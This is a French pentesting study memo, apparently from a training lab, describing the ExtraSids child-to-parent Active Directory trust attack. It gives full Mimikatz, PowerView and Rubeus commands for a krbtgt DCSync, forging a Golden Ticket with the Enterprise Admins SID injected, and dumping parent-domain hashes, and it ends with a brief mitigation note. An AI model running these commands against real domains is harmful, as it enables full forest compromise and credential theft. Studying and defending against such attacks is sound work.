# Mémo — Attacking Domain Trusts : Child → Parent (depuis Windows)

> **ExtraSids attack** : une fois un **child domain** compromis (Domain Admin dessus), on remonte au **parent / root de la forêt** sans être Enterprise Admin.
> Principe : **intra-forêt, pas de SID Filtering** → l'attribut `sidHistory` est respecté. On forge un **Golden Ticket** du child en y injectant le SID du groupe **Enterprise Admins** du parent → full access sur toute la forêt.
> Lab : child `LOGISTICS.INLANEFREIGHT.LOCAL` (DC02) → parent `INLANEFREIGHT.LOCAL` (DC01).

---

## 1. SID History — rappel

- `sidHistory` : attribut utilisé en **migration**. Un user migré d'un domaine A vers B garde son ancien SID dans le `sidHistory` de son nouveau compte → conserve l'accès aux ressources de A.
- Au logon, **tous les SIDs** (dont ceux du sidHistory) sont ajoutés au **token** de l'user → déterminent les accès.
- **SID history injection** (Mimikatz) : injecter le SID d'un compte privilégié dans le sidHistory d'un compte qu'on contrôle → on hérite de ses droits (ex. Domain/Enterprise Admin → DCSync + Golden Ticket).
- **SID Filtering** = protection qui filtre les requêtes d'auth venant d'un domaine d'une **autre forêt**. ⚠️ Pas appliqué **intra-forêt** → d'où la faisabilité de l'attaque child→parent.

## 2. Pré-requis (à collecter sur le child compromis)

| Donnée | Comment l'obtenir | Valeur lab |
|--------|-------------------|------------|
| **KRBTGT NT hash** du child | DCSync sur le child | `9d765b482771505cbe97411065964d5f` |
| **SID** du child domain | `Get-DomainSID` (ou sortie Mimikatz) | `S-1-5-21-2806153819-209893948-922872689` |
| **User cible** du child | n'importe quel nom, **peut ne pas exister** | `hacker` (fake) |
| **FQDN** du child | connu | `LOGISTICS.INLANEFREIGHT.LOCAL` |
| **SID Enterprise Admins** du root | `Get-DomainGroup` sur le parent | `S-1-5-21-3842939050-3880317879-2865463114-519` |

> 💡 Le **krbtgt** signe/chiffre tous les tickets Kerberos du domaine. Le posséder = forger des TGT arbitraires (**Golden Ticket**). Seule invalidation = **changer 2× le mot de passe du krbtgt** (à faire après un pentest avec compromission totale).

## 3. Collecte des données

```powershell
# a) KRBTGT hash du child (DCSync — on est DA sur le child)
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
#   → Hash NTLM: 9d765b482771505cbe97411065964d5f
#   → Object Security ID donne aussi le SID du domaine (502 = krbtgt)

# b) SID du child domain (PowerView)
Get-DomainSID
#   → S-1-5-21-2806153819-209893948-922872689

# c) SID du groupe Enterprise Admins du PARENT
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
#   → S-1-5-21-3842939050-3880317879-2865463114-519
#   (alt built-in : Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL")
```

**Vérifier l'absence d'accès au DC parent AVANT l'attaque :**
```powershell
ls \\academy-ea-dc01.inlanefreight.local\c$     # → Access is denied
```

## 4. Forger le Golden Ticket

### Option A — Mimikatz
```powershell
mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL ^
  /sid:S-1-5-21-2806153819-209893948-922872689 ^
  /krbtgt:9d765b482771505cbe97411065964d5f ^
  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```

### Option B — Rubeus
```powershell
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f ^
  /domain:LOGISTICS.INLANEFREIGHT.LOCAL ^
  /sid:S-1-5-21-2806153819-209893948-922872689 ^
  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 ^
  /user:hacker /ptt
```

| Flag | Rôle |
|------|------|
| `/krbtgt` (Mimikatz) / `/rc4` (Rubeus) | NT hash du krbtgt du child |
| `/sid` | SID du child domain |
| `/sids` | **SID Enterprise Admins du parent** → l'ExtraSID injecté |
| `/user` | nom du compte à forger (peut être bidon) |
| `/ptt` | **Pass-The-Ticket** : injecte le TGT directement en mémoire |

## 5. Vérifier & exploiter

```powershell
klist                                           # TGT 'hacker @ LOGISTICS...' présent en mémoire

# Accès au DC parent (avant = denied, maintenant = OK)
ls \\academy-ea-dc01.inlanefreight.local\c$

# DCSync sur le parent pour récupérer un DA du root
mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
#   → Hash NTLM: 663715a1a8b957e8e9943cc98ea451b6
```
> Si le domaine cible ≠ domaine du user, préciser `/domain` :
> `lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL`

---

## 6. À retenir

| Étape | Commande clé |
|-------|--------------|
| krbtgt child | `lsadump::dcsync /user:LOGISTICS\krbtgt` |
| SID child | `Get-DomainSID` |
| SID Enterprise Admins parent | `Get-DomainGroup -Domain <parent> -Identity "Enterprise Admins"` |
| Golden Ticket (Mimikatz) | `kerberos::golden /user:hacker /domain:<child> /sid:<child> /krbtgt:<hash> /sids:<EA SID> /ptt` |
| Golden Ticket (Rubeus) | `Rubeus.exe golden /rc4:<hash> /domain:<child> /sid:<child> /sids:<EA SID> /user:hacker /ptt` |
| Preuve | `ls \\<DC parent>\c$` puis `lsadump::dcsync /user:<parent>\<DA>` |

**Pourquoi ça marche** : intra-forêt → **pas de SID Filtering** → le SID Enterprise Admins mis en `/sids` (ExtraSID) est respecté dans le token. **Mitigation** : SID Filtering / quarantine entre domaines, rotation du krbtgt.
